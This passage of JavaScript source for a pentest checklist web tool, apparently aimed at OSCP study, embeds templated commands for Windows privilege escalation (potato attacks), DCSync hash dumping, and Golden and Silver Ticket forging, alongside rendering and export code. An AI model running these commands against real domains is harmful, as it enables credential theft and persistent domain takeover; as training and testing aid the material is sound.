        hint: "Base para entender grupos, privil√©gios e contexto.",
        cmds: [
          "whoami /all",
          "systeminfo",
          "net localgroup administrators"
        ]
      },
      {
        id: "winpe_tools",
        title: "Rodar PowerUp e WinPEAS, salvar output e revisar com calma",
        hint: "Isso costuma entregar a trilha. Se n√£o entregar, revisar enum manual e hip√≥tese.",
        cmds: [
          "# winPEAS:",
          ".\\winPEASx64.exe | tee winpeas.log",
          "# PowerUp (PowerShell):",
          "Import-Module .\\PowerUp.ps1; Invoke-AllChecks | tee powerup.log"
        ]
      },
      {
        id: "winpe_listening_ports",
        title: "Checar portas listening e conex√µes",
        hint: "Pode indicar servi√ßo √∫til, pivot ou t√∫nel.",
        cmds: [
          "netstat -ano | findstr LISTEN",
          "netstat -ano | findstr ESTABLISHED"
        ]
      },
      {
        id: "winpe_tokens_impersonate",
        title: "Checar tokens e SeImpersonatePrivilege",
        hint: "Se tiver SeImpersonate (comum em service accounts e IIS), use potato attacks.",
        cmds: [
          "whoami /priv",
          "# Se tiver SeImpersonatePrivilege:",
          "# GodPotato: .\\GodPotato.exe -cmd \"cmd /c whoami\"",
          "# PrintSpoofer: .\\PrintSpoofer64.exe -c \"cmd /c whoami\"",
          "# JuicyPotato (Win10 < 1809 / Server 2019):"
        ]
      }
    ]
  },

  {
    category: "Domain Dominance (endgame)",
    icon: "üëë",
    items: [
      {
        id: "ad_dcsync_full",
        title: "DCSync completo (dump de todo o dom√≠nio)",
        hint: "Com DA ou DCSync rights, extraia todos os hashes do dom√≠nio.",
        cmds: [
          "secretsdump.py {domain}/{user}:\"{pass}\"@{ip} -just-dc -outputfile full_dcsync",
          "# Apenas Administrator:",
          "secretsdump.py {domain}/{user}:\"{pass}\"@{ip} -just-dc-user Administrator",
          "# Apenas krbtgt (para Golden Ticket):",
          "secretsdump.py {domain}/{user}:\"{pass}\"@{ip} -just-dc-user krbtgt"
        ]
      },
      {
        id: "ad_golden_ticket",
        title: "Golden Ticket (persist√™ncia com krbtgt hash)",
        hint: "Com o hash do krbtgt, crie TGT para qualquer user. √ötil para persist√™ncia.",
        cmds: [
          "# Obter domain SID:",
          "# lookupsid.py {domain}/{user}:\"{pass}\"@{ip} | head -5",
          "# Criar Golden Ticket:",
          "ticketer.py -nthash {krbtgt_hash} -domain-sid {domain_sid} -domain {domain} administrator",
          "export KRB5CCNAME=administrator.ccache",
          "# Usar o ticket:",
          "psexec.py -k -no-pass {domain}/administrator@{dc_host}"
        ]
      },
      {
        id: "ad_silver_ticket",
        title: "Silver Ticket (acesso a servi√ßo espec√≠fico)",
        hint: "Com o hash da machine account do host, forje ticket para servi√ßo espec√≠fico (CIFS, HTTP, etc.).",
        cmds: [
          "ticketer.py -nthash {machine_hash} -domain-sid {domain_sid} -domain {domain} -spn cifs/{target_computer}.{domain} administrator",
          "export KRB5CCNAME=administrator.ccache",
          "smbclient.py -k -no-pass {target_computer}.{domain}"
        ]
      }
    ]
  },

  {
    category: "Rescue loop (quando travar)",
    icon: "üßØ",
    items: [
      {
        id: "ad_rescan_verify",
        title: "Re-scan e validar hip√≥tese + ferramentas",
        hint: "Refa√ßa full scan, confirme DNS/clock/rotas, revise o que j√° foi enumerado e o que faltou.",
        cmds: [
          "nmap -p- -Pn {ip} -v --min-rate 1000 -oN rescan.txt",
          "sudo ntpdate -u {ip} 2>/dev/null || true",
          "dig @{ip} {domain} ANY",
          "cat /etc/hosts | grep {domain}"
        ]
      },
      {
        id: "ad_recheck_manual_enum",
        title: "Revisar enum manual e procurar o √≥bvio",
        hint: "Shares, pol√≠ticas, usu√°rios, lockout, SPNs, endpoints expostos. Depois considerar brute controlado.",
        cmds: [
          "# Checklist mental de rescue:",
          "# 1. Refiz full scan? Encontrei porta nova?",
          "# 2. UDP top ports: rodei? SNMP? DNS zone transfer?",
          "# 3. Refiz enum de shares com cada cred que tenho?",
          "# 4. Tentei web enum em todas as portas HTTP?",
          "# 5. Certipy find rodou? Algum ESC?",
          "# 6. BH est√° atualizado? Coleta nova com nova cred?",
          "# 7. Spray com varia√ß√µes sazonais/comuns?",
          "# 8. Portas internas (localhost) que preciso forwardar?"
        ]
      }
    ]
  },

  {
    category: "Troubleshooting Kerberos & AD",
    icon: "üîß",
    items: [
      {
        id: "ad_ts_clock_skew",
        title: "KRB_AP_ERR_SKEW (clock desalinhado)",
        hint: "Kerberos exige clock sync < 5min. Sync com DC.",
        cmds: [
          "sudo ntpdate -u {ip} 2>/dev/null || true",
          "date",
          "# Se ntpdate n√£o existir:",
          "sudo timedatectl set-ntp false",
          "sudo date -s \"$(curl -s http://{ip}/ -D - 2>/dev/null | grep Date | cut -d' ' -f2-)\""
        ]
      },
      {
        id: "ad_ts_dns_resolve",
        title: "Cannot find KDC / DNS n√£o resolve",
        hint: "Kerberos precisa de DNS funcional ou /etc/hosts configurado.",
        cmds: [
          "dig +short {domain}",
          "dig +short _kerberos._tcp.{domain} SRV",
          "cat /etc/resolv.conf",
          "# Fix: apontar DNS para o DC:",
          "sudo sh -c 'echo nameserver {ip} > /etc/resolv.conf'",
          "# Ou adicionar em /etc/hosts:",
          "sudo sh -c 'echo \"{ip} {dc_host} {domain}\" >> /etc/hosts'"
        ]
      },
      {
        id: "ad_ts_user_format",
        title: "Formato de usu√°rio (erros de auth)",
        hint: "Diferentes ferramentas esperam formatos diferentes.",
        cmds: [
          "# Impacket: {domain}/{user}:\"{pass}\"",
          "# netexec: -u {user} -p \"{pass}\" (dom√≠nio via -d ou impl√≠cito)",
          "# evil-winrm: -u {user} -p \"{pass}\" (sem dom√≠nio)",
          "# LDAP bind: '{user}@{domain}' ou 'CN={user},CN=Users,DC=...'",
          "# Kerberos: {user}@{domain} (UPN)"
        ]
      }
    ]
  },

  {
    category: "Refer√™ncias √∫teis",
    icon: "üìö",
    items: [
      {
        id: "ref_hacktricks_ad",
        title: "HackTricks: Active Directory Methodology",
        hint: "https://book.hacktricks.xyz/windows/active-directory-methodology"
      },
      {
        id: "ref_haax_kerberos",
        title: "Cheatsheet HaaX: Kerberos",
        hint: "https://cheatsheet.haax.fr/windows-systems/exploitation/kerberos/"
      },
      {
        id: "ref_tarlogic_kerberos",
        title: "Tarlogic: How to attack Kerberos",
        hint: "https://www.tarlogic.com/blog/how-to-attack-kerberos/"
      },
      {
        id: "ref_ad_attack_series",
        title: "YouTube: AD attack series (playlist)",
        hint: "https://www.youtube.com/playlist?list=PLPDUz8KkxR5z2z84CJ1JyLXC9JgxkjPBk"
      },
      {
        id: "ref_winpeas",
        title: "winPEAS (PEASS-ng)",
        hint: "https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS"
      },
      {
        id: "ref_powersploit",
        title: "PowerSploit (PowerUp etc.)",
        hint: "https://github.com/PowerShellMafia/PowerSploit.git"
      },
      {
        id: "ref_stealthbits",
        title: "Stealthbits AD Attack Catalog",
        hint: "https://attack.stealthbits.com/"
      },
      {
        id: "ref_enum4linux_ng",
        title: "enum4linux-ng",
        hint: "https://github.com/cddmp/enum4linux-ng"
      },
      {
        id: "ref_static_bin",
        title: "Bin√°rios Est√°ticos / Static Binaries",
        hint: "https://github.com/andrew-d/static-binaries"
      },
      {
        id: "ref_thehacker_recipes",
        title: "The Hacker Recipes (AD attacks)",
        hint: "https://www.thehacker.recipes/ad/movement"
      },
      {
        id: "ref_ired_team",
        title: "ired.team (Red Team Notes)",
        hint: "https://www.ired.team/"
      }
    ]
  }
];


function checklistKey(baseKey, slot) {
  return `${baseKey}_slot_${slot}`;
}

function loadChecklistState(baseKey, slot) {
  const key = checklistKey(baseKey, slot);
  const stored = loadJSON(key, null);

  if (stored && typeof stored === "object") {
    return {
      checked: stored.checked && typeof stored.checked === "object" ? stored.checked : {},
      open: stored.open && typeof stored.open === "object" ? stored.open : {},
      cmdOpen: stored.cmdOpen && typeof stored.cmdOpen === "object" ? stored.cmdOpen : {}
    };
  }
  return { checked: {}, open: {}, cmdOpen: {} };
}


function saveChecklistState(baseKey, slot, state) {
  const key = checklistKey(baseKey, slot);
  saveJSON(key, state);
}

function sectionProgress(def, state, section) {
  const ids = section.items.map(i => i.id);
  const done = ids.filter(id => !!state.checked[id]).length;
  return { done, total: ids.length };
}

function checklistToMarkdown(title, def, state) {
  const out = [];
  out.push(`# ${title}`);
  out.push("");

  def.forEach(sec => {
    out.push(`## ${sec.category}`);
    out.push("");

    sec.items.forEach(it => {
      const mark = state.checked[it.id] ? "x" : " ";
      out.push(`- [${mark}] ${it.title} (${it.id})`);

      if (it.hint) out.push(`  - ${it.hint}`);

      const cmds = [];
      if (it.cmd) cmds.push(it.cmd);
      if (Array.isArray(it.cmds)) cmds.push(...it.cmds);

      if (cmds.length) {
        out.push("");
        out.push("```bash");
        cmds.forEach(c => out.push(c));
        out.push("```");
      }
    });

    out.push("");
  });

  return out.join("\n");
}


function downloadText(filename, text, mime) {
  const blob = new Blob([text], { type: mime || "text/plain;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  a.click();
  URL.revokeObjectURL(url);
}

function renderChecklistInto(containerEl, def, baseKey, slot, titleForExport) {
  if (!containerEl) return;

  let state = loadChecklistState(baseKey, slot);
  containerEl.innerHTML = "";

  const base = getValues();
  const v = computeDerived(base);


  def.forEach(sec => {
    const section = document.createElement("div");
    section.className = "section";
    section.dataset.open = state.open[sec.category] ? "true" : "false";
    section.dataset.accent = stableAccentKey(sec.category || "x");

    const head = document.createElement("div");
    head.className = "sectionHead";

    const left = document.createElement("div");
    left.className = "sectionTitle";
    left.innerHTML = `<span>${sec.icon || "‚Ä¢"}</span><span>${escapeHtml(sec.category)}</span>`;

    const prog = sectionProgress(def, state, sec);
    const badge = document.createElement("span");
    badge.className = "badge";
    badge.textContent = `${prog.done}/${prog.total}`;

    const chev = document.createElement("span");
    chev.className = "chev";
    chev.textContent = "‚ñæ";

    head.appendChild(left);
    head.appendChild(badge);
    head.appendChild(chev);

    const body = document.createElement("div");
    body.className = "sectionBody";
    body.style.display = section.dataset.open === "true" ? "grid" : "none";

    const list = document.createElement("div");
    list.className = "oscpList";

    sec.items.forEach(it => {
      const row = document.createElement("div");
      row.className = "oscpRow";

      const isDone = !!state.checked[it.id];
      row.classList.toggle("done", isDone);

      const cb = document.createElement("input");
      cb.className = "oscpCheck";
      cb.type = "checkbox";
      cb.checked = isDone;

      const text = document.createElement("div");
      text.className = "oscpText";

      const t = document.createElement("div");
      t.className = "oscpTitle";
      t.textContent = it.title;
      text.appendChild(t);

      if (it.hint) {
        const h = document.createElement("div");
        h.className = "oscpHint";
        h.textContent = it.hint;
        text.appendChild(h);
      }

      const meta = document.createElement("div");
      meta.className = "oscpMeta";

      const pill = document.createElement("span");
      pill.className = "oscpPill";
      pill.textContent = it.id;

      meta.appendChild(pill);

      const cmds = [];
      if (it.cmd) cmds.push(it.cmd);
      if (Array.isArray(it.cmds)) cmds.push(...it.cmds);

      let cmdsWrap = null;

      if (cmds.length) {
        const isCmdOpen = !!state.cmdOpen[it.id];

        const btnToggleCmds = document.createElement("button");
        btnToggleCmds.className = "btn btnTiny";
        btnToggleCmds.type = "button";
        btnToggleCmds.textContent = isCmdOpen ? `Ocultar (${cmds.length})` : `Ver comandos (${cmds.length})`;

        meta.appendChild(btnToggleCmds);

        cmdsWrap = document.createElement("div");
        cmdsWrap.className = "checkCmds";
        cmdsWrap.style.marginLeft = "44px";
        cmdsWrap.style.marginTop = "10px";
        cmdsWrap.style.display = isCmdOpen ? "grid" : "none";
        cmdsWrap.style.gap = "10px";

        cmds.forEach((cmdStr, idx) => {
          const cmdPlain = renderCmdPlain(cmdStr, v);
          const cmdHtml = renderCmdHighlightedSafe(cmdStr, v);

          const card = document.createElement("div");
          card.className = "cmdCard";

          const top2 = document.createElement("div");
          top2.className = "cmdCardTop";

          const t2 = document.createElement("div");
          t2.className = "title";
          t2.textContent = cmds.length > 1 ? `Command ${idx + 1}` : "Command";

          const btn2 = document.createElement("button");
          btn2.className = "btn";
          btn2.textContent = "Copy";
          btn2.addEventListener("click", (e) => {
            e.stopPropagation();
            copy(cmdPlain);
          });

          top2.appendChild(t2);
          top2.appendChild(btn2);

          const code2 = document.createElement("div");
          code2.className = "code";
          applyCodeSpacingEl(code2);
          code2.innerHTML = toSpacedLinesHtml(cmdHtml);

          card.appendChild(top2);
          card.appendChild(code2);

          cmdsWrap.appendChild(card);
        });

        btnToggleCmds.addEventListener("click", (e) => {
          e.stopPropagation();
          const nowOpen = cmdsWrap.style.display === "none";
          cmdsWrap.style.display = nowOpen ? "grid" : "none";

          state.cmdOpen[it.id] = nowOpen;
          saveChecklistState(baseKey, slot, state);

          btnToggleCmds.textContent = nowOpen ? `Ocultar (${cmds.length})` : `Ver comandos (${cmds.length})`;
        });
      }


      cb.addEventListener("change", (e) => {
        state.checked[it.id] = e.target.checked;
        saveChecklistState(baseKey, slot, state);

        row.classList.toggle("done", e.target.checked);

        const p = sectionProgress(def, state, sec);
        badge.textContent = `${p.done}/${p.total}`;
      });

      row.appendChild(cb);
      row.appendChild(text);
      row.appendChild(meta);

      list.appendChild(row);
      if (cmdsWrap) list.appendChild(cmdsWrap);
    });

    body.appendChild(list);

    head.addEventListener("click", () => {
      const isOpen = section.dataset.open === "true";
      section.dataset.open = (!isOpen).toString();
      body.style.display = isOpen ? "none" : "grid";
      state.open[sec.category] = !isOpen;
      saveChecklistState(baseKey, slot, state);
    });

    section.appendChild(head);
    section.appendChild(body);

    containerEl.appendChild(section);
  });

  return {
    expandAll(open) {
      state = loadChecklistState(baseKey, slot);
      def.forEach(sec => { state.open[sec.category] = open; });
      saveChecklistState(baseKey, slot, state);
      renderChecklistInto(containerEl, def, baseKey, slot, titleForExport);
    },
    reset() {
      state = { checked: {}, open: {} };
      saveChecklistState(baseKey, slot, state);
      renderChecklistInto(containerEl, def, baseKey, slot, titleForExport);
    },
    exportMd(filenameBase) {
      state = loadChecklistState(baseKey, slot);
      const md = checklistToMarkdown(titleForExport, def, state);
      downloadText(filenameBase, md, "text/markdown;charset=utf-8");
    }
  };
}


function renderCheatsheet() {
  const prevOpen = snapshotOpenSections(els.cheatsContainer);

  const base = getValues();
  const v = computeDerived(base);

  els.cheatsContainer.innerHTML = "";

  CHEATS.forEach(group => {
    const section = document.createElement("div");
    section.className = "section";
    section.dataset.open = "false";
    section.dataset.accent = stableAccentKey(group.category || "x");
    section.dataset.key = group.category || "";

    const head = document.createElement("div");
    head.className = "sectionHead";

    const left = document.createElement("div");
    left.className = "sectionTitle";
    left.innerHTML = `<span>${group.icon}</span><span>${escapeHtml(group.category)}</span>`;

    const badge = document.createElement("span");
    badge.className = "badge";
    badge.textContent = `${group.items.length} blocks`;

    const chev = document.createElement("span");
    chev.className = "chev";
    chev.textContent = "‚ñæ";

    head.appendChild(left);
    head.appendChild(badge);
    head.appendChild(chev);

    const body = document.createElement("div");
    body.className = "sectionBody";
    body.style.display = "none";

    if (group.note) {
      const n = document.createElement("div");
      n.className = "note";
      n.textContent = group.note;
      body.appendChild(n);
    }

    group.items.forEach(block => {
      const item = document.createElement("div");
      item.className = "item";
      item.dataset.open = "false";

      const itemHead = document.createElement("div");
      itemHead.className = "itemHead";

      const name = document.createElement("div");
      name.className = "itemName";
      name.textContent = block.title;

      const tag = document.createElement("span");
      tag.className = "tag";
      tag.textContent = group.category;
      name.appendChild(tag);

      const right = document.createElement("div");
      right.className = "row";

      const btn = document.createElement("button");
      btn.className = "btn";
      btn.textContent = "Copy all";
      btn.addEventListener("click", (e) => {
        e.stopPropagation();
        const text = (block.steps || [])
          .map(s => renderCmdPlain(s.cmd, v))
          .join("\n\n");
        copy(text);
      });

      const itemChev = document.createElement("span");
      itemChev.className = "itemChev";
      itemChev.textContent = "‚ñæ";

      right.appendChild(btn);
      right.appendChild(itemChev);

      itemHead.appendChild(name);
      itemHead.appendChild(right);

      const innerWrap = document.createElement("div");
      innerWrap.style.display = "none";
      innerWrap.style.paddingBottom = "10px";

      if (block.note) {
        const n2 = document.createElement("div");
        n2.className = "note";
        n2.textContent = block.note;
        innerWrap.appendChild(n2);
      }

      (block.steps || []).forEach(step => {
        if (step.title) {
          const st = document.createElement("div");
          st.className = "stepTitle";
          st.textContent = step.title;
          innerWrap.appendChild(st);
        }

        const card = document.createElement("div");
        card.className = "cmdCard";

        const top2 = document.createElement("div");
        top2.className = "cmdCardTop";

        const t = document.createElement("div");
        t.className = "title";
        t.textContent = "Command";

        const btn2 = document.createElement("button");
        btn2.className = "btn";
        btn2.textContent = "Copy";
        btn2.addEventListener("click", (e) => {
          e.stopPropagation();
          copy(renderCmdPlain(step.cmd, v));
        });

        top2.appendChild(t);
        top2.appendChild(btn2);

        const code2 = document.createElement("div");
        code2.className = "code";
        applyCodeSpacingEl(code2);

        const html = renderCmdHighlightedSafe(step.cmd, v);
        code2.innerHTML = toSpacedLinesHtml(html);

        card.appendChild(top2);
        card.appendChild(code2);

        innerWrap.appendChild(card);
      });

      itemHead.addEventListener("click", () => {
        const isOpen = item.dataset.open === "true";
        item.dataset.open = (!isOpen).toString();
        innerWrap.style.display = isOpen ? "none" : "block";
      });

      item.appendChild(itemHead);
      item.appendChild(innerWrap);
      body.appendChild(item);
    });

    head.addEventListener("click", () => {
      const isOpen = section.dataset.open === "true";
      section.dataset.open = (!isOpen).toString();
      body.style.display = isOpen ? "none" : "grid";
    });

    section.appendChild(head);
    section.appendChild(body);
    els.cheatsContainer.appendChild(section);
  });

  restoreOpenSections(els.cheatsContainer, prevOpen);
}

async function copyCheatAll() {
  const base = getValues();
  const v = computeDerived(base);

  const out = [];
  CHEATS.forEach(group => {
    out.push(`# ${group.category}`);
    if (group.note) out.push(`> ${group.note}`);
    out.push("");
    group.items.forEach(block => {
      out.push(`## ${block.title}`);
      if (block.note) out.push(`> ${block.note}`);
      out.push("");
      (block.steps || []).forEach(step => {
        out.push(`### ${step.title || "Step"}`);
        out.push(renderCmdPlain(step.cmd, v));
        out.push("");
      });
    });
  });

  await copy(out.join("\n"));
}

function workspaceToMarkdown() {
  const log = els.wsLog.value || "";
  const checklist = els.wsChecklist.value || "";
  const creds = els.wsCreds.value || "";

  return [
    "# Workspace",
    "",
    "## Engagement Log",
    "```",
    log.trimEnd(),
    "```",
    "",
    "## Checklist",
    "```",
    checklist.trimEnd(),
    "```",
    "",
    "## Creds",
    "```",
    creds.trimEnd(),
    "```",
    ""
  ].join("\n");
}

function exportWorkspace() {
  const md = workspaceToMarkdown();
  const blob = new Blob([md], { type: "text/markdown;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "pentestbench_workspace.md";
  a.click();
  URL.revokeObjectURL(url);
  toast("Exportado.");
}

function renderAll() {
  const tags = buildTagSet(getRecipes());
  renderTagChips(tags);
  renderCommands();
  renderCheatsheet();
}

function bind() {
  els.tabs.forEach(b => b.addEventListener("click", () => setTab(b.dataset.tab)));

  [
    els.profile, els.ip, els.port, els.url, els.domain, els.user, els.pass,
    els.wordlist, els.hashfile, els.lhost, els.lport, els.iface, els.proxy
  ].forEach(el => {
    el.addEventListener("input", () => {
      renderCommands();
      renderCheatsheet();
      renderOscpStandalone();
      renderAdChecklist();
    });
    el.addEventListener("change", () => {
      renderCommands();
      renderCheatsheet();
      renderOscpStandalone();
      renderAdChecklist();
    });
  });

  els.btnClearSearch.addEventListener("click", () => {
    els.cmdSearch.value = "";
    renderCommands();
  });

  els.cmdSearch.addEventListener("input", () => renderCommands());

  els.btnResetAll.addEventListener("click", resetAll);

  els.btnToggleAll.addEventListener("click", () => expandAll(!allExpanded));

  els.wsLog.addEventListener("input", persistWorkspace);
  els.wsChecklist.addEventListener("input", persistWorkspace);
  els.wsCreds.addEventListener("input", persistWorkspace);

  els.btnWsInsertTs.addEventListener("click", () => {
    const stamp = `[${nowStamp()}] `;
    const cur = els.wsLog.value || "";
    els.wsLog.value = cur ? `${cur.trimEnd()}\n${stamp}` : stamp;
    persistWorkspace();
    toast("Timestamp inserido.");
  });

  els.btnWsCopyMd.addEventListener("click", async () => copy(workspaceToMarkdown()));
  els.btnWsExport.addEventListener("click", exportWorkspace);

  els.btnWsClear.addEventListener("click", () => {
    els.wsLog.value = "";
    els.wsChecklist.value = "";
    els.wsCreds.value = "";
    persistWorkspace();
    toast("Workspace limpo.");
  });


  let oscpApi = null;
  let adApi = null;

  function renderOscpStandalone() {
    const slot = els.oscpSlot ? els.oscpSlot.value : "1";
    oscpApi = renderChecklistInto(
      els.oscpContainer,
      OSCP_STANDALONE_CHECKLIST,
      STORE.oscpStandalone,
      slot,
      `OSCP Standalone Checklist (Slot ${slot})`
    );
  }

  function renderAdChecklist() {
    adApi = renderChecklistInto(
      els.adContainer,
      AD_CHECKLIST,
      STORE.adChecklist,
      "ad",
      "AD Checklist"
    );
  }

  if (els.oscpSlot) {
    els.oscpSlot.addEventListener("change", () => {
      renderOscpStandalone();
      toast(`Slot ${els.oscpSlot.value} carregado.`);
    });
  }

  if (els.btnOscpExpandAll) els.btnOscpExpandAll.addEventListener("click", () => oscpApi && oscpApi.expandAll(true));
  if (els.btnOscpCollapseAll) els.btnOscpCollapseAll.addEventListener("click", () => oscpApi && oscpApi.expandAll(false));
  if (els.btnOscpReset) els.btnOscpReset.addEventListener("click", () => oscpApi && oscpApi.reset());
  if (els.btnOscpExportMd) els.btnOscpExportMd.addEventListener("click", () => {
    const slot = els.oscpSlot ? els.oscpSlot.value : "1";
    oscpApi && oscpApi.exportMd(`oscp_standalone_slot_${slot}.md`);
  });

  if (els.btnAdExpandAll) els.btnAdExpandAll.addEventListener("click", () => adApi && adApi.expandAll(true));
  if (els.btnAdCollapseAll) els.btnAdCollapseAll.addEventListener("click", () => adApi && adApi.expandAll(false));
  if (els.btnAdReset) els.btnAdReset.addEventListener("click", () => adApi && adApi.reset());
  if (els.btnAdExportMd) els.btnAdExportMd.addEventListener("click", () => adApi && adApi.exportMd("oscp_ad_checklist.md"));

  renderOscpStandalone();
  renderAdChecklist();
}

function init() {
  cacheEls();

  const saved = loadJSON(STORE.values, null);
  if (saved) applyValues(saved);
  else applyValues({});

  const storedRecipes = loadJSON(STORE.recipes, null);
  if (!Array.isArray(storedRecipes) || !storedRecipes.length) setRecipes(DEFAULT_RECIPES);

  els.wsLog.value = localStorage.getItem(STORE.ws_log) || "";
  els.wsChecklist.value = localStorage.getItem(STORE.ws_check) || "";
  els.wsCreds.value = localStorage.getItem(STORE.ws_creds) || "";

  bind();

  allExpanded = false;
  setToggleAllLabel();

  renderAll();
  setTab("commands");
}

document.addEventListener("DOMContentLoaded", init);